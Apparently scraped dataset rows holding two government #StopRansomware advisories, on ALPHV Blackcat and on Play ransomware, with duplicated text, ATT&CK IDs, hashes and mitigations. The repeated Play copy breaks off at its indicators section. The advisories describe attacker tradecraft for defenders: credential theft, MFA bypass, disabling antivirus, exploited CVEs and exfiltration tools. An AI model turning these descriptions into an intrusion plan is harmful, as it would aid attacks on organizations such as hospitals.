The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and HHS do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, and HHS.
VERSION HISTORY
December 19, 2023: Initial version.February 27, 2024: Update.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1586', 'T1598', 'T1557', 'T1558', 'T1555'}","






Actions to take today to mitigate against the threat of ransomware:




Routinely take inventory of assets and data to identify authorized and unauthorized devices and software.
Prioritize remediation of known exploited vulnerabilities.
Enable and enforce multifactor authentication with strong passwords.
Close unused ports and remove applications not deemed necessary for day-to-day operations.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Health and Human Services (HHS) are releasing this joint CSA to disseminate known IOCs and TTPs associated with the ALPHV Blackcat ransomware as a service (RaaS) identified through FBI investigations as recently as February 2024.
This advisory provides updates to the FBI FLASH BlackCat/ALPHV Ransomware Indicators of Compromise released April 19, 2022, and to this advisory released December 19, 2023. ALPHV Blackcat actors have since employed improvised communication methods by creating victim-specific emails to notify of the initial compromise. Since mid-December 2023, of the nearly 70 leaked victims, the healthcare sector has been the most commonly victimized. This is likely in response to the ALPHV Blackcat administrator’s post encouraging its affiliates to target hospitals after operational action against the group and its infrastructure in early December 2023.
FBI, CISA, and HHS encourage critical infrastructure organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ALPHV Blackcat ransomware and data extortion incidents.
In February 2023, ALPHV Blackcat administrators announced the ALPHV Blackcat Ransomware 2.0 Sphynx update, which was rewritten to provide additional features to affiliates, such as better defense evasion and additional tooling. This ALPHV Blackcat update has the capability to encrypt both Windows and Linux devices, and VMWare instances. ALPHV Blackcat affiliates have extensive networks and experience with ransomware and data extortion operations.
Download the PDF version of this report:


AA23-353A #StopRansomware: ALPHV Blackcat (Update)
(PDF,       578.24 KB
  )


For a downloadable copy of IOCs, see:


AA23-353A STIX XML
(XML,       46.14 KB
  )




AA23-353A STIX JSON
(JSON,       32.93 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
ALPHV Blackcat affiliates use advanced social engineering techniques and open source research on a company to gain initial access. Actors pose as company IT and/or helpdesk staff and use phone calls or SMS messages, to obtain credentials from employees to access the target network,. ALPHV Blackcat affiliates use uniform resource locators (URLs) to live-chat with victims to convey demands and initiate processes to restore the victims’ encrypted files.
After gaining access to a victim network, ALPHV Blackcat affiliates deploy remote access software such as AnyDesk, Mega sync, and Splashtop in preparation of data exfiltration. ALPHV Blackcat affiliates create a user account, “aadmin,” and use Kerberos token generation for domain access,. After gaining access to networks, they use legitimate remote access and tunneling tools, such as Plink and Ngrok,S0508,. ALPHV Blackcat affiliates claim to use Brute Ratel C4,S1063, and Cobalt Strike,S1054, as beacons to command and control servers. ALPHV Blackcat affiliates use the open source adversary-in-the-middle attack, framework Evilginx2, which allows them to obtain multifactor authentication (MFA) credentials, login credentials, and session cookies. The actors also obtain passwords from the domain controller, local network, and deleted backup servers to move laterally throughout the network,.
To evade detection, affiliates employ allowlisted applications such as Metasploit. Once installed on the domain controller, the logs are cleared on the exchange server. Then Mega.nz or Dropbox are used to move, exfiltrate, and/or download victim data. The ransomware is then deployed, and the ransom note is embedded as a file.txt. According to public reporting, affiliates have additionally used POORTRY and STONESTOP to terminate security processes.
Some ALPHV Blackcat affiliates exfiltrate data after gaining access and extort victims without deploying ransomware. After exfiltrating and/or encrypting data, ALPHV Blackcat affiliates communicate with victims via TOR,S0183, Tox, email, or encrypted applications. The threat actors then delete victim data from the victim’s system.
ALPHV Blackcat affiliates offer to provide unsolicited cyber remediation advice as an incentive for payment, offering to provide victims with “vulnerability reports” and “security recommendations” detailing how they penetrated the system and how to prevent future re-victimization upon receipt of ransom payment. The ALPHV Blackcat encryptor results in a file with the following naming convention: RECOVER-(seven-digit extension) FILES.txt.

 

Figure 1: Ransom Note Instruction

INDICATORS OF COMPROMISE (IOCs)




MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 5 through Table 7 for all referenced threat actor tactics and techniques in this advisory.



INCIDENT RESPONSE
If compromise is detected, organizations should:

Quarantine or take offline potentially affected hosts.
Reimage compromised hosts.
Provision new account credentials.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.
Report the compromise or phishing incident to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870). State, local, tribal, or territorial government entities can also report to MS-ISAC (SOC@cisecurity.org or 866-787-4722).
To report spoofing or phishing attempts (or to report that you’ve been a victim), file a complaint with the FBI’s Internet Crime Complaint Center (IC3), or contact your local FBI Field Office to report an incident.

MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders. FBI, CISA, and HHS recommend that software manufactures incorporate secure by design principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the security posture for their customers.
For more information on secure by design, see CISA’s Secure by Design webpage and joint guide.
FBI, CISA, and HHS recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture based on threat actor activity and to reduce the risk of compromise by ALPHV Blackcat threat actors. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections. Due to the threat ALPHV Blackcat’s poses in the healthcare sector, healthcare organizations can look to the Healthcare and Public Health (HPH) Sector Cybersecurity Performance Goals to implement cybersecurity protections against the most common threats. tactics, techniques, and procedures used against this sector.

Secure remote access tools by:

Implementing application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Applying recommendations in CISA's joint Guide to Securing Remote Access Software.


Implementing FIDO/WebAuthn authentication or Public key Infrastructure (PKI)-based MFA,CPG 2.H,HPH CPG – Multifactor Authentication,. These MFA implementations are resistant to phishing and not susceptible to push bombing or SIM swap attacks, which are techniques known be used by ALPHV Blackcat affiliates. See CISA’s Fact Sheet Implementing Phishing-Resistant MFA for more information.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic,CPG 5.1,HPH CPG – Detect and Respond to Relevant Threats and Tactics, Techniques and Procedures, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Implement user training on social engineering and phishing attacks,CPG 2.I,HPH CPG – Basic Cybersecurity Training,. Regularly educate users on identifying suspicious emails and links, not interacting with those suspicious items, and the importance of reporting instances of opening suspicious emails, links, attachments, or other potential lures.
Implement internal mail and messaging monitoring. Monitoring internal mail and messaging traffic to identify suspicious activity is essential as users may be phished from outside the targeted network or without the knowledge of the organizational security team. Establish a baseline of normal network traffic and scrutinize any deviations.
Implement free security tools to prevent cyber threat actors from redirecting users to malicious websites to steal their credentials. For more information see, CISA’s Free Cybersecurity Services and Tools webpage.
Install and maintain antivirus software. Antivirus software recognizes malware and protects your computer against it. Installing antivirus software from a reputable vendor is an important step in preventing and detecting infections. Always visit vendor sites directly rather than clicking on advertisements or email links. Because attackers are continually creating new viruses and other forms of malicious code, it is important to keep your antivirus software up to date.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 1-3).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to reduce the risk of a ransomware attack: #StopRansomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.
Health and Human Services HPH Cybersecurity Gateway hosts the HPH CPGs and links to HHS cybersecurity resources.

DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and HHS do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, and HHS.
VERSION HISTORY
December 19, 2023: Initial version.February 27, 2024: Update.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-353a
6,"






Actions to take today to mitigate cyber threats from Play ransomware:




Prioritize remediating known exploited vulnerabilities.
Enable multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.
Regularly patch and update software and applications to their latest versions and conduct regular vulnerability assessments.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and Australian Signals Directorate’s Australian Cyber Security Centre (ASD's ACSC) are releasing this joint CSA to disseminate the Play ransomware group’s IOCs and TTPs identified through FBI investigations as recently as October 2023.
Since June 2022, the Play (also known as Playcrypt) ransomware group has impacted a wide range of businesses and critical infrastructure in North America, South America, and Europe. As of October 2023, the FBI was aware of approximately 300 affected entities allegedly exploited by the ransomware actors.
In Australia, the first Play ransomware incident was observed in April 2023, and most recently in November 2023.
The Play ransomware group is presumed to be a closed group, designed to “guarantee the secrecy of deals,” according to a statement on the group’s data leak website. Play ransomware actors employ a double-extortion model, encrypting systems after exfiltrating data. Ransom notes do not include an initial ransom demand or payment instructions, rather, victims are instructed to contact the threat actors via email.
The FBI, CISA, and ASD’s ACSC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. This includes requiring multifactor authentication, maintaining offline backups of data, implementing a recovery plan, and keeping all operating systems, software, and firmware up to date.
Download a PDF version of this report:


AA23-352A #StopRansomware: Play Ransomware
(PDF,       536.19 KB
  )


For a downloadable copy of IOCs, see:


AA23-352A STIX XML
(XML,       34.87 KB
  )




AA23-352A STIX JSON
(JSON,       30.22 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK for Enterprise section for all referenced tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Initial Access
The Play ransomware group gains initial access to victim networks through the abuse of valid accounts [T1078] and exploitation of public-facing applications [T1190], specifically through known FortiOS (CVE-2018-13379 and CVE-2020-12812) and Microsoft Exchange (ProxyNotShell [CVE-2022-41040 and CVE-2022-41082]) vulnerabilities. Play ransomware actors have been observed to use external-facing services [T1133] such as Remote Desktop Protocol (RDP) and Virtual Private Networks (VPN) for initial access.
Discovery and Defense Evasion
Play ransomware actors use tools like AdFind to run Active Directory queries [TA0007] and Grixba [1], an information-stealer, to enumerate network information [T1016] and scan for anti-virus software [T1518.001]. Actors also use tools like GMER, IOBit, and PowerTool to disable anti-virus software [T1562.001] and remove log files [T1070.001]. In some instances, cybersecurity researchers have observed Play ransomware actors using PowerShell scripts to target Microsoft Defender.[2]
Lateral Movement and Execution
Play ransomware actors use command and control (C2) applications, including Cobalt Strike and SystemBC, and tools like PsExec, to assist with lateral movement and file execution. Once established on a network, the ransomware actors search for unsecured credentials [T1552] and use the Mimikatz credential dumper to gain domain administrator access [T1003]. According to open source reporting [2], to further enumerate vulnerabilities, Play ransomware actors use Windows Privilege Escalation Awesome Scripts (WinPEAS) [T1059] to search for additional privilege escalation paths. Actors then distribute executables [T1570] via Group Policy Objects [T1484.001].
Exfiltration and Encryption
Play ransomware actors often split compromised data into segments and use tools like WinRAR to compress files [T1560.001] into .RAR format for exfiltration. The actors then use WinSCP to transfer data [T1048] from a compromised network to actor-controlled accounts. Following exfiltration, files are encrypted [T1486] with AES-RSA hybrid encryption using intermittent encryption, encrypting every other file portion of 0x100000 bytes. [3] (Note: System files are skipped during the encryption process.) A .play extension is added to file names and a ransom note titled ReadMe[.]txt is placed in file directory C:.
Impact
The Play ransomware group uses a double-extortion model [T1657], encrypting systems after exfiltrating data. The ransom note directs victims to contact the Play ransomware group at an email address ending in @gmx[.]de. Ransom payments are paid in cryptocurrency to wallet addresses provided by Play actors. If a victim refuses to pay the ransom demand, the ransomware actors threaten to publish exfiltrated data to their leak site on the Tor network ([.]onion URL).
Leveraged Tools
Table 1 lists legitimate tools Play ransomware actors have repurposed for their operations. The legitimate tools listed in this product are all publicly available. Use of these tools and applications should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors.

Table 1: Tools Leveraged by Play Ransomware Actors


Name
Description




AdFind
Used to query and retrieve information from Active Directory.


Bloodhound
Used to query and retrieve information from Active Directory.


GMER
A software tool intended to be used for detecting and removing rootkits.


IOBit
An anti-malware and anti-virus program for the Microsoft Windows operating system. Play actors have accessed IOBit to disable anti-virus software.


PsExec
A tool designed to run programs and execute commands on remote systems.


PowerTool
A Windows utility designed to improve speed, remove bloatware, protect privacy, and eliminate data collection, among other things.


PowerShell
A cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.


Cobalt Strike
A penetration testing tool used by security professionals to test the security of networks and systems. Play ransomware actors have used it to assist with lateral movement and file execution.


Mimikatz
Allows users to view and save authentication credentials such as Kerberos tickets. Play ransomware actors have used it to add accounts to domain controllers.


WinPEAS
Used to search for additional privilege escalation paths.


WinRAR
Used to split compromised data into segments and to compress files into .RAR format for exfiltration.


WinSCP
Windows Secure Copy is a free and open-source Secure Shell (SSH) File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Play ransomware actors have used it to transfer data [T1048] from a compromised network to actor-controlled accounts.


Microsoft Nltest
Used by Play ransomware actors for network discovery.


Nekto / PriviCMD
Used by Play ransomware actors for privilege escalation.


Process Hacker
Used to enumerate running processes on a system.


Plink
Used to establish persistent SSH tunnels.



Indicators of Compromise
See Table 2 for Play ransomware IOCs obtained from FBI investigations as of October 2023.

Table 2: Hashes Associated with Play Ransomware Actors


Hashes (SHA256)
Description




453257c3494addafb39cb6815862403e827947a1e7737eb8168cd10522465deb
Play ransomware custom data gathering tool


47c7cee3d76106279c4c28ad1de3c833c1ba0a2ec56b0150586c7e8480ccae57
Play ransomware encryptor


75404543de25513b376f097ceb383e8efb9c9b95da8945fd4aa37c7b2f226212
SystemBC malware EXE


7a42f96599df8090cf89d6e3ce4316d24c6c00e499c8557a2e09d61c00c11986
SystemBC malware DLL


7a6df63d883bbccb315986c2cfb76570335abf84fafbefce047d126b32234af8
Play ransomware binary


7dea671be77a2ca5772b86cf8831b02bff0567bce6a3ae023825aa40354f8aca
SystemBC malware DLL


c59f3c8d61d940b56436c14bc148c1fe98862921b8f7bad97fbc96b31d71193c
Play network scanner


e652051fe47d784f6f85dc00adca1c15a8c7a40f1e5772e6a95281d8bf3d5c74
Play ransomware binary


e8d5ad0bf292c42a9185bb1251c7e763d16614c180071b01da742972999b95da
Play ransomware binary



MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 3–Table 11 for all referenced threat actor tactics and techniques in this advisory.

Table 3: Play ATT&CK Techniques for Enterprise for Initial Access


Technique Title
ID
Use




Valid Accounts
T1078
Play ransomware actors obtain and abuse existing account credentials to gain initial access.


Exploit Public Facing Application
T1190
Play ransomware actors exploit vulnerabilities in internet-facing systems to gain access to networks.


External Remote Services
T1133
Play ransomware actors have used remote access services, such as RDP/VPN connection to gain initial access.




Table 4: Play ATT&CK Techniques for Enterprise for Discovery


Technique Title
ID
Use




System Network Configuration Discovery
T1016
Play ransomware actors use tools like Grixba to identify network configurations and settings.


Software Discovery: Security Software Discovery
T1518.001
Play ransomware actors scan for anti-virus software.




Table 5: Play ATT&CK Techniques for Enterprise for Defense Evasion


Technique Title
ID
Use




Impair Defenses: Disable or Modify Tools
T1562.001
Play ransomware actors use tools like GMER, IOBit, and PowerTool to disable anti-virus software.


Indicator Removal: Clear Windows Event Logs
T1070.001
Play ransomware actors delete logs or other indicators of compromise to hide intrusion activity.




Table 6: Play ATT&CK Techniques for Enterprise for Credential Access


Technique Title
ID
Use




Unsecured Credentials
T1552
Play ransomware actors attempt to identify and exploit credentials stored unsecurely on a compromised network.


OS Credential Dumping
T1003
Play ransomware actors use tools like Mimikatz to dump credentials.




Table 7: Play ATT&CK Techniques for Enterprise for Lateral Movement


Technique Title
ID
Use




Lateral Tool Transfer
T1570
Play ransomware actors distribute executables within the compromised environment.




Table 8: Play ATT&CK Techniques for Enterprise for Command and Control


Technique Title
ID
Use




Domain Policy Modification: Group Policy Modification
T1484.001
Play ransomware actors distribute executables via Group Policy Objects.




Table 9: Play ATT&CK Techniques for Enterprise for Collection


Technique Title
ID
Use




Archive Collected Data: Archive via Utility
T1560.001
Play ransomware actors use tools like WinRAR to compress files.




Table 10: Play ATT&CK Techniques for Enterprise for Exfiltration


Technique Title
ID
Use




Exfiltration Over Alternative Protocol
T1048
Play ransomware actors use file transfer tools like WinSCP to transfer data.




Table 11: Play ATT&CK Techniques for Enterprise for Impact


Technique Title
ID
Use




Data Encrypted for Impact
T1486
Play ransomware actors encrypt data on target systems to interrupt availability to system and network resources.


Financial Theft
T1657
Play ransomware actors use a double-extortion model for financial gain.



MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders. The FBI, CISA, and ASD’s ACSC recommend that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices to limit the impact of ransomware techniques (such as threat actors leveraging backdoor vulnerabilities into remote software systems), thus, strengthening the security posture for their customers.For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
The FBI, CISA, and ASD’s ACSC recommend organizations apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Play ransomware. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers [CPG 2.F, 2.R, 2.S] in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST’s standards for developing and managing password policies [CPG 2.C].

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length [CPG 2.B];
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts [CPG 2.G];
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require multifactor authentication [CPG 2.H] for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems. Also see Protect Yourself: Multi-Factor Authentication | Cyber.gov.au.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E]. Organizations are advised to deploy the latest Microsoft Exchange security updates. If unable to patch, then disable Outlook Web Access (OWA) until updates are able to be undertaken. Also see Patching Applications and Operating Systems | Cyber.gov.au.
Segment networks [CPG 2.F] to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. Also see Implementing Network Segmentation and Segregation.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network [CPG 1.E]. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Filter network traffic by preventing unknown or untrusted origins from accessing remote services on internal systems. This prevents actors from directly connecting to remote access services they have established for persistence. Also see Inbound Traffic Filtering – Technique D3-ITF.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts [CPG 1.A, 2.O].
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege [CPG 2.E].
Disable unused ports [CPG 2.V].
Consider adding an email banner to emails [CPG 2.M] received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the just-in-time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Disable command-line and scripting activities and permissions. Privileged escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally [CPG 2.E].
Maintain offline backups of data and regularly maintain backup and restoration [CPG 2.R]. By instituting this practice, an organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K].

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI, CISA, and ASD’s ACSC recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and ASD’s ACSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 3-11).
Align your security technologies against this technique.
Test your technologies against this technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI, CISA, and ASD’s ACSC recommend continually testing your security program at scale and in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: #StopRansomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Play ransomware actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
The FBI, CISA, and ASD’s ACSC do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, the FBI’s Internet Crime Complaint Center (IC3), or CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870).
Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ASD's ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to cyber.gov.au.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and the FBI do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or the FBI.
REFERENCES
[1] Symantec: Play Ransomware Group Using New Custom Data-Gathering Tools[2] TrendMicro: Play Ransomware Spotlight[3] SentinelLabs: Ransomware Developers Turn to Intermittent Encryption to Evade Detection






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1059', 'T1190', 'T1003', 'T1560.001', 'T1518.001', 'T1562.001', 'T1484.001', 'T1486', 'T1657', 'T1570', 'T1133', 'T1552', 'T1070.001', 'TA0007', 'T1048', 'T1078', 'T1016'}","






Actions to take today to mitigate cyber threats from Play ransomware:




Prioritize remediating known exploited vulnerabilities.
Enable multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.
Regularly patch and update software and applications to their latest versions and conduct regular vulnerability assessments.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and Australian Signals Directorate’s Australian Cyber Security Centre (ASD's ACSC) are releasing this joint CSA to disseminate the Play ransomware group’s IOCs and TTPs identified through FBI investigations as recently as October 2023.
Since June 2022, the Play (also known as Playcrypt) ransomware group has impacted a wide range of businesses and critical infrastructure in North America, South America, and Europe. As of October 2023, the FBI was aware of approximately 300 affected entities allegedly exploited by the ransomware actors.
In Australia, the first Play ransomware incident was observed in April 2023, and most recently in November 2023.
The Play ransomware group is presumed to be a closed group, designed to “guarantee the secrecy of deals,” according to a statement on the group’s data leak website. Play ransomware actors employ a double-extortion model, encrypting systems after exfiltrating data. Ransom notes do not include an initial ransom demand or payment instructions, rather, victims are instructed to contact the threat actors via email.
The FBI, CISA, and ASD’s ACSC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. This includes requiring multifactor authentication, maintaining offline backups of data, implementing a recovery plan, and keeping all operating systems, software, and firmware up to date.
Download a PDF version of this report:


AA23-352A #StopRansomware: Play Ransomware
(PDF,       536.19 KB
  )


For a downloadable copy of IOCs, see:


AA23-352A STIX XML
(XML,       34.87 KB
  )




AA23-352A STIX JSON
(JSON,       30.22 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK for Enterprise section for all referenced tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Initial Access
The Play ransomware group gains initial access to victim networks through the abuse of valid accounts, and exploitation of public-facing applications, specifically through known FortiOS (CVE-2018-13379 and CVE-2020-12812) and Microsoft Exchange (ProxyNotShell,CVE-2022-41040 and CVE-2022-41082,) vulnerabilities. Play ransomware actors have been observed to use external-facing services, such as Remote Desktop Protocol (RDP) and Virtual Private Networks (VPN) for initial access.
Discovery and Defense Evasion
Play ransomware actors use tools like AdFind to run Active Directory queries, and Grixba,1, an information-stealer, to enumerate network information, and scan for anti-virus software,. Actors also use tools like GMER, IOBit, and PowerTool to disable anti-virus software, and remove log files,. In some instances, cybersecurity researchers have observed Play ransomware actors using PowerShell scripts to target Microsoft Defender.,2,
Lateral Movement and Execution
Play ransomware actors use command and control (C2) applications, including Cobalt Strike and SystemBC, and tools like PsExec, to assist with lateral movement and file execution. Once established on a network, the ransomware actors search for unsecured credentials, and use the Mimikatz credential dumper to gain domain administrator access,. According to open source reporting,2, to further enumerate vulnerabilities, Play ransomware actors use Windows Privilege Escalation Awesome Scripts (WinPEAS), to search for additional privilege escalation paths. Actors then distribute executables, via Group Policy Objects,.
Exfiltration and Encryption
Play ransomware actors often split compromised data into segments and use tools like WinRAR to compress files, into .RAR format for exfiltration. The actors then use WinSCP to transfer data, from a compromised network to actor-controlled accounts. Following exfiltration, files are encrypted, with AES-RSA hybrid encryption using intermittent encryption, encrypting every other file portion of 0x100000 bytes.,3, (Note: System files are skipped during the encryption process.) A .play extension is added to file names and a ransom note titled ReadMe,.,txt is placed in file directory C:.
Impact
The Play ransomware group uses a double-extortion model, encrypting systems after exfiltrating data. The ransom note directs victims to contact the Play ransomware group at an email address ending in @gmx,.,de. Ransom payments are paid in cryptocurrency to wallet addresses provided by Play actors. If a victim refuses to pay the ransom demand, the ransomware actors threaten to publish exfiltrated data to their leak site on the Tor network (,.,onion URL).
Leveraged Tools
Table 1 lists legitimate tools Play ransomware actors have repurposed for their operations. The legitimate tools listed in this product are all publicly available. Use of these tools and applications should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors.

Indicators of Compromise
